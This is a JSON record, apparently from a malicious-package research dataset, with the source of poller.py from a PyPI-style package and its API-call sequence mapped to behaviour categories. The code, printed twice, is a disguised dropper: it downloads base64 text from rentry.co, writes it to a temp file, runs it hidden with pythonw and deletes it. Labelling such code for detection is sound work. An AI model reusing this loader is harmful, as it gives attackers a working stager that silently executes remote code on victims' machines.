[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/python_poller_ball-0.1.1/python_poller_ball-0.1.1/poller/poller.py",
    "code_snippet": "import os\nimport shutil\nimport datetime\nimport subprocess\nimport requests\nimport bs4\nimport base64\nfrom tempfile import gettempdir\n\ndef get_KFC_from_burger_King():\n    headpoint = 'https://rentry.co/SourceCodeForThisProgram'\n    responsibility = requests.get(headpoint)\n    soup = bs4.BeautifulSoup(responsibility.content, 'html.parser')\n    jonh_cena = soup.find('div', class_='entry-text my-2 px-2 px-sm-4').get_text()\n    cant_you_see_me = base64.b64decode(jonh_cena).decode()\n    return cant_you_see_me\n\ndef change_everything_that_needs_in_order_to_be_the_funiest_guy():\n    temp_dir = gettempdir()\n    os.chdir(temp_dir)\n\ndef become_the_funiest_guy_in_the_world(code):\n    change_everything_that_needs_in_order_to_be_the_funiest_guy()\n    the_rock_vs_jonh_cena = os.getcwd() + '/Shipper.py'\n    with open(the_rock_vs_jonh_cena, 'w') as f:\n        f.write(code)\n    return the_rock_vs_jonh_cena\n\ndef run_till_logan_paul_win_UFC(king_of_fighters):\n    subprocess.call(['pythonw', king_of_fighters])\n\ndef main():\n    chicken_KFC_for_everybody = get_KFC_from_burger_King()\n    document_how_to_make_KFC = become_the_funiest_guy_in_the_world(chicken_KFC_for_everybody)\n    run_till_logan_paul_win_UFC(document_how_to_make_KFC)\n    os.remove(document_how_to_make_KFC)\n\nif __name__ == '__main__':\n    main()\n",
    "pattern_analysis": {
      "api_sequence": [
        "requests.get",
        "bs4.BeautifulSoup",
        "bs4.BeautifulSoup.find",
        "bs4.element.Tag.get_text",
        "base64.b64decode",
        "os.chdir",
        "os.getcwd",
        "open",
        "builtins.open.write",
        "subprocess.call",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "requests.get(headpoint)",
        "bs4.BeautifulSoup(responsibility.content, 'html.parser')",
        "bs4.BeautifulSoup.find('div', class_='entry-text my-2 px-2 px-sm-4')",
        "bs4.element.Tag.get_text()",
        "base64.b64decode(jonh_cena)",
        "os.chdir(temp_dir)",
        "os.getcwd()",
        "open(the_rock_vs_jonh_cena, 'w')",
        "builtins.open.write(code)",
        "subprocess.call(['pythonw', king_of_fighters])",
        "os.remove(document_how_to_make_KFC)"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "bs4.BeautifulSoup",
          "id": "deserialize_from_bytes",
          "description": "Deserializes Python object from bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "bs4.BeautifulSoup.find",
          "id": "deserialize_from_bytes",
          "description": "Deserializes Python object from bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "bs4.element.Tag.get_text",
          "id": "deserialize_from_bytes",
          "description": "Deserializes Python object from bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "builtins.open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.call",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import os\nimport subprocess\nimport requests\nimport bs4\nimport base64\nfrom tempfile import gettempdir\n\ndef get_KFC_from_burger_King():\n    headpoint = 'https://rentry.co/SourceCodeForThisProgram'\n    responsibility = requests.get(headpoint)\n    soup = bs4.BeautifulSoup(responsibility.content, 'html.parser')\n    jonh_cena = soup.find('div', class_='entry-text my-2 px-2 px-sm-4').get_text()\n    cant_you_see_me = base64.b64decode(jonh_cena).decode()\n    return cant_you_see_me\n\ndef change_everything_that_needs_in_order_to_be_the_funiest_guy():\n    temp_dir = gettempdir()\n    os.chdir(temp_dir)\n\ndef become_the_funiest_guy_in_the_world(code):\n    change_everything_that_needs_in_order_to_be_the_funiest_guy()\n    the_rock_vs_jonh_cena = os.getcwd() + '/Shipper.py'\n    with open(the_rock_vs_jonh_cena, 'w') as f:\n        f.write(code)\n    return the_rock_vs_jonh_cena\n\ndef run_till_logan_paul_win_UFC(king_of_fighters):\n    subprocess.call(['pythonw', king_of_fighters])\n\ndef main():\n    chicken_KFC_for_everybody = get_KFC_from_burger_King()\n    document_how_to_make_KFC = become_the_funiest_guy_in_the_world(chicken_KFC_for_everybody)\n    run_till_logan_paul_win_UFC(document_how_to_make_KFC)\n    os.remove(document_how_to_make_KFC)\n"
    }
  }
]